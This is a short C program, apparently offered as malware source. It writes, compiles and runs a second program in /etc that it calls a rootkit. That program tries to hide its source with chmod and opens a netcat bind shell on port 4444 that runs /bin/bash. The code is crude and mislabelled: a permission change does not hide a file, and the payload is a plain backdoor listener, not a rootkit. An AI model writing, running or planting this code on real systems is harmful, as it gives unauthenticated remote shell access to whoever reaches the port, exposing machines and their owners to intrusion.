#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
    // Create a rootkit file
    FILE *fp;
    fp = fopen("/etc/rootkit.c", "w");
    if (fp == NULL) {
        printf("Error creating rootkit file!\n");
        exit(1);
    }

    // Write rootkit code to the file
    fprintf(fp, "#include <stdio.h>\n");
    fprintf(fp, "#include <sys/types.h>\n");
    fprintf(fp, "#include <unistd.h>\n");
    fprintf(fp, "#include <sys/stat.h>\n");
    fprintf(fp, "\n");
    fprintf(fp, "int main(int argc, char *argv[])\n");
    fprintf(fp, "{\n");
    fprintf(fp, "    // Hide the rootkit file\n");
    fprintf(fp, "    chmod(\"/etc/rootkit.c\", 0);\n");
    fprintf(fp, "\n");
    fprintf(fp, "    // Create a backdoor\n");
    fprintf(fp, "    system(\"/bin/bash -c 'nc -l -p 4444 -e /bin/bash'\");\n");
    fprintf(fp, "\n");
    fprintf(fp, "    return 0;\n");
    fprintf(fp, "}\n");

    fclose(fp);

    // Compile the rootkit
    system("gcc -o /etc/rootkit /etc/rootkit.c");

    // Make the rootkit executable
    chmod("/etc/rootkit", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);

    // Execute the rootkit
    system("/etc/rootkit");

    return 0;
}